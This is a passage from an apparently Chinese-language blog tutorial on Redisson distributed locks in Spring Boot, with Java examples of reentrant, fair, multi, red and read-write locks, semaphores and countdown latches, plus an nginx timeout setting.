RedisStrictCommand&lt;T&gt; command)</span> &#123;  <br>    <span class="hljs-keyword">return</span> evalWriteAsync(getRawName(), LongCodec.INSTANCE, command,  <br>            <span class="hljs-string">&quot;if (redis.call(&#x27;exists&#x27;, KEYS[1]) == 0) then &quot;</span> +  <br>                    <span class="hljs-string">&quot;redis.call(&#x27;hincrby&#x27;, KEYS[1], ARGV[2], 1); &quot;</span> +  <br>                    <span class="hljs-string">&quot;redis.call(&#x27;pexpire&#x27;, KEYS[1], ARGV[1]); &quot;</span> +  <br>                    <span class="hljs-string">&quot;return nil; &quot;</span> +  <br>                    <span class="hljs-string">&quot;end; &quot;</span> +  <br>                    <span class="hljs-string">&quot;if (redis.call(&#x27;hexists&#x27;, KEYS[1], ARGV[2]) == 1) then &quot;</span> +  <br>                    <span class="hljs-string">&quot;redis.call(&#x27;hincrby&#x27;, KEYS[1], ARGV[2], 1); &quot;</span> +  <br>                    <span class="hljs-string">&quot;redis.call(&#x27;pexpire&#x27;, KEYS[1], ARGV[1]); &quot;</span> +  <br>                    <span class="hljs-string">&quot;return nil; &quot;</span> +  <br>                    <span class="hljs-string">&quot;end; &quot;</span> +  <br>                    <span class="hljs-string">&quot;return redis.call(&#x27;pttl&#x27;, KEYS[1]);&quot;</span>,  <br>            Collections.singletonList(getRawName()), unit.toMillis(leaseTime), getLockName(threadId));  <br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到Redisson中的加锁方法也是采用lua脚本</p><p>Redisson锁的自动定时续期是通过：<code>scheduleExpirationRenewal</code> 方法实现</p><p>其方法内部通过 <code>renewExpiration</code> 重置过期时间，采用TimerTask完成定时任务</p><p>解锁方法unlock也是采用lua脚本</p><p><strong>Redisson自动续期、可重入与防死锁</strong></p><p>实现方案与之前手动实现的Redis分布式锁类似</p><ol><li><p>如果当前代码运行时间过长，超出了锁的过期时间，但是程序仍在执行过程中，所以需要为锁续期</p><p>-&gt; Redisson内部提供了一个监控锁的看门狗（定时任务），它的作用是在Redisson实例被关闭前，不断地延长锁的有效期。默认情况下，看门狗每隔30秒检查一次。</p></li><li><p>如果负责储存分布式锁的Redisson节点宕机后，而这个锁恰好处于锁住状态，这时候会出现死锁。</p><p>-&gt; Redisson通过为锁设置超时时间（有效期），若有效期内没有定时任务为其续期，则其超过该时间就会自动解开。</p></li></ol><h5 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h5><p>测试自动续期代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deduct</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">RLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.redissonClient.getLock(<span class="hljs-string">&quot;lock&quot;</span>);<br>    lock.lock();<br>    <span class="hljs-comment">// 查询库存信息</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">stock</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().get(<span class="hljs-string">&quot;stock&quot;</span>).toString();<br>    <span class="hljs-comment">// 判断库存是否充足</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (stock != <span class="hljs-literal">null</span> &amp;&amp; stock.length() != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-type">Integer</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> Integer.valueOf(stock);<br>            <span class="hljs-keyword">if</span> (st &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-comment">// 扣减库存</span><br>                redisTemplate.opsForValue().set(<span class="hljs-string">&quot;stock&quot;</span>, String.valueOf(--st));<br>            &#125;<br>        &#125;<br>        TimeUnit.SECONDS.sleep(<span class="hljs-number">1000</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        lock.unlock();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>测试可重入代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deduct</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">RLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.redissonClient.getLock(<span class="hljs-string">&quot;lock&quot;</span>);<br>    lock.lock();<br>    <span class="hljs-comment">// 查询库存信息</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">stock</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().get(<span class="hljs-string">&quot;stock&quot;</span>).toString();<br>    <span class="hljs-comment">// 判断库存是否充足</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (stock != <span class="hljs-literal">null</span> &amp;&amp; stock.length() != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-type">Integer</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> Integer.valueOf(stock);<br>            <span class="hljs-keyword">if</span> (st &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-comment">// 扣减库存</span><br>                redisTemplate.opsForValue().set(<span class="hljs-string">&quot;stock&quot;</span>, String.valueOf(--st));<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        lock.unlock();<br>    &#125;<br>    <span class="hljs-built_in">this</span>.test();<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">RLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.redissonClient.getLock(<span class="hljs-string">&quot;lock&quot;</span>);<br>    lock.lock();<br>    System.out.println(<span class="hljs-string">&quot;测试可重入锁...&quot;</span>);<br>    lock.unlock();<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-5-3-公平锁"><a href="#2-5-3-公平锁" class="headerlink" title="2.5.3 公平锁"></a>2.5.3 公平锁</h4><p>公平的体现：公平锁保证当多个Redisson客户端线程同时请求加锁时，优先分配给先发出请求的线程。</p><p>所有的请求线程会在一个队列中排队。如果某线程宕机后，Redisson等待5秒后继续下一个线程。</p><p>举个🌰：若前面有5个线程宕机，那么延迟将会是25秒。</p><p>顺便提一点：个人认为此处Redisson官方的<a href="https://github.com/redisson/redisson/wiki/8.-distributed-locks-and-synchronizers">中文文档</a>描述略有不妥，不是<del>前面5个线程处于等待状态</del>，而是处于宕机状态</p><blockquote><p>  所有请求线程会在一个队列中排队，当某个线程出现宕机时，Redisson会等待5秒后继续下一个线程，也就是说如果前面有5个线程都处于等待状态，那么后面的线程会等待至少25秒。</p></blockquote><p>对照英文版本：</p><blockquote><p>  All waiting threads are queued and if some thread has died then Redisson waits its return for 5 seconds. For example, if 5 threads are died for some reason then delay will be 25 seconds.</p></blockquote><h5 id="测试代码-1"><a href="#测试代码-1" class="headerlink" title="测试代码"></a>测试代码</h5><ol><li><p>在StockController添加新的测试方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;test/fair/lock/&#123;id&#125;&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">testFairLock</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;id&quot;)</span> Long id)</span> &#123;<br>    <span class="hljs-built_in">this</span>.stockService.testFairLock(id);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello test fair lock&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>在StockService添加新的测试方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testFairLock</span><span class="hljs-params">(Long id)</span> &#123;<br>    <span class="hljs-type">RLock</span> <span class="hljs-variable">fairLock</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.redissonClient.getFairLock(<span class="hljs-string">&quot;fairLock&quot;</span>);<br>    fairLock.lock();<br>    System.out.println(<span class="hljs-string">&quot;测试公平锁==================&quot;</span> + id);<br>    <span class="hljs-keyword">try</span> &#123;<br>        TimeUnit.SECONDS.sleep(<span class="hljs-number">10</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        fairLock.unlock();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>启动SpringBoot，依次在浏览器请求 <code>test/fair/lock/&#123;id&#125;</code> 5次</p><p>可以看到最终的输出顺序和请求顺序一致，说明实现了公平锁</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221014004141382.png" alt="image-20221014004141382"></p><p>如果开启了两个SpringBoot并采用nginx进行负载均衡，会出现一个请求被发送多次的情况。</p><p>这是因为nginx有纠错机制，当发送一个请求长时间未得到响应时，nginx会再次发送。</p><p>解决方案：配置nginx.conf文件，将超时时间延长。重新配置之后记得重新启动nginx。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span>       <span class="hljs-number">80</span>;<br>    <span class="hljs-attribute">server_name</span>  localhost;<br>    <span class="hljs-attribute">proxy_connect_timeout</span> <span class="hljs-number">12000</span><br>    proxy_send_timeout <span class="hljs-number">12000</span><br>    proxy_read_timeout <span class="hljs-number">12000</span><br>    location / &#123;<br>        <span class="hljs-attribute">proxy_pass</span> http://distributedLock;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-5-4-联锁"><a href="#2-5-4-联锁" class="headerlink" title="2.5.4 联锁"></a>2.5.4 联锁</h4><p>Redisson可以将多个RLock对象关联为一个联锁。即要么同时上锁，要么同时解锁</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">RLock</span> <span class="hljs-variable">lock1</span> <span class="hljs-operator">=</span> redissonInstance1.getLock(<span class="hljs-string">&quot;lock1&quot;</span>);<br><span class="hljs-type">RLock</span> <span class="hljs-variable">lock2</span> <span class="hljs-operator">=</span> redissonInstance2.getLock(<span class="hljs-string">&quot;lock2&quot;</span>);<br><span class="hljs-type">RLock</span> <span class="hljs-variable">lock3</span> <span class="hljs-operator">=</span> redissonInstance3.getLock(<span class="hljs-string">&quot;lock3&quot;</span>);<br><br><span class="hljs-type">RedissonMultiLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedissonMultiLock</span>(lock1, lock2, lock3);<br><span class="hljs-comment">// 同时加锁：lock1 lock2 lock3</span><br><span class="hljs-comment">// 所有的锁都上锁成功才算成功。</span><br>lock.lock();<br>...<br>lock.unlock();<br></code></pre></td></tr></table></figure><p>但是缺点很明显：任何一个Redis宕机之后，其他所有的Redis都不可用，一般不用。</p><h4 id="2-5-5-红锁"><a href="#2-5-5-红锁" class="headerlink" title="2.5.5 红锁"></a>2.5.5 红锁</h4><p>红锁与联锁的不同之处在于：红锁只要大部分（过半数）节点上加锁成功就算成功。红锁也不重要</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">RLock</span> <span class="hljs-variable">lock1</span> <span class="hljs-operator">=</span> redissonInstance1.getLock(<span class="hljs-string">&quot;lock1&quot;</span>);<br><span class="hljs-type">RLock</span> <span class="hljs-variable">lock2</span> <span class="hljs-operator">=</span> redissonInstance2.getLock(<span class="hljs-string">&quot;lock2&quot;</span>);<br><span class="hljs-type">RLock</span> <span class="hljs-variable">lock3</span> <span class="hljs-operator">=</span> redissonInstance3.getLock(<span class="hljs-string">&quot;lock3&quot;</span>);<br><br><span class="hljs-type">RedissonRedLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedissonRedLock</span>(lock1, lock2, lock3);<br><span class="hljs-comment">// 同时加锁：lock1 lock2 lock3</span><br><span class="hljs-comment">// 红锁在大部分节点上加锁成功就算成功。</span><br>lock.lock();<br>...<br>lock.unlock();<br></code></pre></td></tr></table></figure><h4 id="2-5-6-读写锁"><a href="#2-5-6-读写锁" class="headerlink" title="2.5.6 读写锁"></a>2.5.6 读写锁</h4><p>读写锁特性为：读操作可以并发，但是写操作之间不可以并发，读操作与写操作不可以并发</p><p>举例论证读写锁存在的必要：</p><ul><li>假设读操作之间可以并发，写操作之间不可以并发。这种加锁方式保证了写操作的安全性</li><li>但这种方式确保不了读与写操作的安全性，因为没有限制读和写的并发，因此需要引入读写锁</li></ul><h5 id="测试代码-2"><a href="#测试代码-2" class="headerlink" title="测试代码"></a>测试代码</h5><ol><li><p>在StockController中新增以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;test/read/lock&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">testReadLock</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">this</span>.stockService.testReadLock();<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello test read lock&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">@GetMapping(&quot;test/write/lock&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">testWriteLock</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">this</span>.stockService.testWriteLock();<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello test write lock&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>在StockService中新增以下代码：选择超时自动解锁的方式加锁</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testReadLock</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">RReadWriteLock</span> <span class="hljs-variable">rwLock</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.redissonClient.getReadWriteLock(<span class="hljs-string">&quot;rwLock&quot;</span>);<br>    rwLock.readLock().lock(<span class="hljs-number">10</span>, TimeUnit.SECONDS);<br>    System.out.println(<span class="hljs-string">&quot;执行写操作...&quot;</span>);<br>    <span class="hljs-comment">//rwLock.readLock().unlock();</span><br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testWriteLock</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">RReadWriteLock</span> <span class="hljs-variable">rwLock</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.redissonClient.getReadWriteLock(<span class="hljs-string">&quot;rwLock&quot;</span>);<br>    rwLock.writeLock().lock(<span class="hljs-number">10</span>, TimeUnit.SECONDS);<br>    System.out.println(<span class="hljs-string">&quot;执行写操作...&quot;</span>);<br>    <span class="hljs-comment">//rwLock.writeLock().unlock();</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>测试对应的方法，然后查看redis中读写锁是如何存储的。</p><ol><li><p>对于读，可以存在多个读操作，mode为read</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221015231801864.png" alt="image-20221015231801864"></p></li><li><p>对于写，同一时间只能有一个写操作，其余均阻塞，mode为write</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221015231952586.png" alt="image-20221015231952586"></p></li><li><p>在读的过程中，写操作会被阻塞；在写的过程中，读操作也会被阻塞</p></li></ol><h4 id="2-5-7-信号量"><a href="#2-5-7-信号量" class="headerlink" title="2.5.7 信号量"></a>2.5.7 信号量</h4><p>与JUC中信号量的共同之处：都可以对请求进行限流，均适用于需求量大资源有限的情景</p><h5 id="JUC信号量"><a href="#JUC信号量" class="headerlink" title="JUC信号量"></a>JUC信号量</h5><p>回顾JUC中的信号量：模拟6个线程争抢有限的3个资源</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Semaphore</span> <span class="hljs-variable">semaphore</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Semaphore</span>(<span class="hljs-number">3</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++) &#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            semaphore.acquire();<br>            System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot;抢到了停车位&quot;</span>);<br>            TimeUnit.SECONDS.sleep(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(<span class="hljs-number">10</span>));<br>            System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot;停了一会儿开走了&quot;</span>);<br>            semaphore.release();<br>        &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;, i + <span class="hljs-string">&quot;号车&quot;</span>).start();<br>&#125;<br></code></pre></td></tr></table></figure><p>输出如下：</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221015233103573.png" alt="image-20221015233103573"></p><p>但是JUC信号量只能对单机情况下进行限流，无法做到对分布式环境进行限流</p><h5 id="分布式信号量"><a href="#分布式信号量" class="headerlink" title="分布式信号量"></a>分布式信号量</h5><ol><li><p>在StockController中添加如下代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;test/semaphore&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">testSemaphore</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.stockService.testSemaphore();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello test semaphore&quot;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure></li><li><p>在StockService中添加如下代码：通过redis记录争抢资源的顺序日志，更直观地证明分布式下的正确性</p><p>如果要更改semaphore可允许线程数的值，记得将redis中旧的值删去（或者起一个新的名字）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testSemaphore</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">RSemaphore</span> <span class="hljs-variable">semaphore</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.redissonClient.getSemaphore(<span class="hljs-string">&quot;semaphore&quot;</span>);<br>    semaphore.trySetPermits(<span class="hljs-number">3</span>); <span class="hljs-comment">// 设置限流的线程数</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        semaphore.acquire(); <span class="hljs-comment">// 获取资源成功之后才可继续处理业务操作，否则阻塞</span><br>        <span class="hljs-built_in">this</span>.redisTemplate.opsForList().rightPush(<span class="hljs-string">&quot;log&quot;</span>, <span class="hljs-string">&quot;10010获取资源，开始处理...&quot;</span> + Thread.currentThread().getName());<br>        TimeUnit.SECONDS.sleep(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(<span class="hljs-number">10</span>));<br>        <span class="hljs-built_in">this</span>.redisTemplate.opsForList().rightPush(<span class="hljs-string">&quot;log&quot;</span>, <span class="hljs-string">&quot;10010处理完成，释放资源...&quot;</span> + Thread.currentThread().getName());<br>        semaphore.release(); <span class="hljs-comment">// 手动释放资源</span><br>    &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>启动两个服务，redis中的输出日志如下：</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221016001007227.png" alt="image-20221016001007227"></p><h4 id="2-5-8-倒计数器（闭锁）"><a href="#2-5-8-倒计数器（闭锁）" class="headerlink" title="2.5.8 倒计数器（闭锁）"></a>2.5.8 倒计数器（闭锁）</h4><p>一个线程(或者多个)， 等待另外N个线程完成某个事情之后才能执行</p><h5 id="JUC倒计数器"><a href="#JUC倒计数器" class="headerlink" title="JUC倒计数器"></a>JUC倒计数器</h5><p>示例代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">CountDownLatch</span> <span class="hljs-variable">countDownLatch</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CountDownLatch</span>(<span class="hljs-number">6</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++) &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; &#123;<br>            System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot;：开始执行...&quot;</span>);<br>            <span class="hljs-keyword">try</span> &#123;<br>                TimeUnit.SECONDS.sleep(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(<span class="hljs-number">5</span>));<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br>            System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot;：结束执行...&quot;</span>);<br>            countDownLatch.countDown();<br>        &#125;, i + <span class="hljs-string">&quot;号线程&quot;</span>).start();<br>    &#125;<br>    countDownLatch.await();<br>&#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>&#125;<br>System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot;：其他线程均已结束，执行最后任务...&quot;</span>);<br></code></pre></td></tr></table></figure><p>输出如下：</p><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221016002330475.png" alt="image-20221016002330475"></p><h5 id="分布式倒计数器"><a href="#分布式倒计数器" class="headerlink" title="分布式倒计数器"></a>分布式倒计数器</h5><ol><li><p>在StockController中添加如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;test/await&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">testLAwait</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">this</span>.stockService.testAwait();<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;wait for other threads...&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">@GetMapping(&quot;test/countdown&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">testCountDown</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">this</span>.stockService.testCountDown();<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;execute...&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>在StockService中添加如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testAwait</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">RCountDownLatch</span> <span class="hljs-variable">cdl</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.redissonClient.getCountDownLatch(<span class="hljs-string">&quot;cdl&quot;</span>);<br>    cdl.trySetCount(<span class="hljs-number">6</span>);<br>    <span class="hljs-keyword">try</span> &#123;<br>        cdl.await(); <span class="hljs-comment">// 阻塞，直到其余所有线程执行完毕</span><br>    &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testCountDown</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">RCountDownLatch</span> <span class="hljs-variable">cdl</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.redissonClient.getCountDownLatch(<span class="hljs-string">&quot;cdl&quot;</span>);<br>    